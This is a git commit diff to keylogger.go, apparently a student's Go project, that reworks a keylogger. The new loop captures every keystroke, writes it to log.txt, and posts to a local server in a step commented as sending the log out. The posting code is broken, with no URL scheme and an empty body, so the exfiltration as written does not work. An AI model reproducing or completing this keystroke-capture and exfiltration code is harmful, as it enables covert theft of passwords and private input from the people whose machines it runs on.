209794d21ff0f623940f1526eb8ba96c079af639
VJMumphrey <vjm007@email.latech.edu>
2023-02-09 12:02:17 -0500

    work on bug fixes

--- keylogger.go
+++ keylogger.go
@@ -1,12 +1,19 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"net/http"
 	"os"
-    "bufio"
 	"github.com/eiannone/keyboard"
 )
+
+func check(err error)() {
+    if err != nil{
+		fmt.Println(err)
+        // os.Exit(1)
+    }
+}
 
 func main() {
 
@@ -14,51 +21,36 @@ func main() {
     f, err := os.Create("log.txt")
     check(err)
 
-    // TODO make sure that chanel acutally closes
     defer f.Close()
 
-	// TODO setup correct concurency so that the keystrokes are read correctly
-    // and they are also not opening and closing the chanel
-	go keylog(*f)
-	go exfil()
+	// Setup infite loop so that it continusously run
+	for true {
+		// log the keystrokes to a file
+		keyboard.Open()
+		defer keyboard.Close()
+
+		key, _, err := keyboard.GetSingleKey()
+		fmt.Println(key)
+		check(err)
+
+		// write the key to the log file 
+		f.WriteString(string(key))
+		check(err)
+		
+		// send the log to a server
+		resp, err := http.Post("127.0.0.1:8090", "log.txt", nil)
+		check(err)
+
+		defer resp.Body.Close()
+
+		scanner := bufio.NewScanner(resp.Body)
+		for i := 0; scanner.Scan() && i < 5; i++ {
+			fmt.Println(scanner.Text())
+		}
+
+		if err := scanner.Err(); err != nil {
+			panic(err)
+		} 
+	}
 }
 
-func check(err error)() {
-    if err != nil{
-        os.Exit(1)
-    }
-}
-
-func keylog (f os.File)() {
-	// log the keystrokes to a file
-    keyboard.Open()
-    defer keyboard.Close()
-
-    rune, _, err := keyboard.GetSingleKey()
-    check(err)
-
-    // write the key to the log file 
-    n, err := f.WriteString(string(rune))
-    fmt.Println(n)
-    check(err)
-
-}
-
-func exfil()() {
-    // send the log to a server
-    
-
-    resp, err := http.Post("url", "image", nil)
-    check(err)
-
-    defer resp.Body.Close()
-
-    scanner := bufio.NewScanner(resp.Body)
-    for i := 0; scanner.Scan() && i < 5; i++ {
-        fmt.Println(scanner.Text())
-    }
-
-    if err := scanner.Err(); err != nil {
-        panic(err)
-    } 
-}
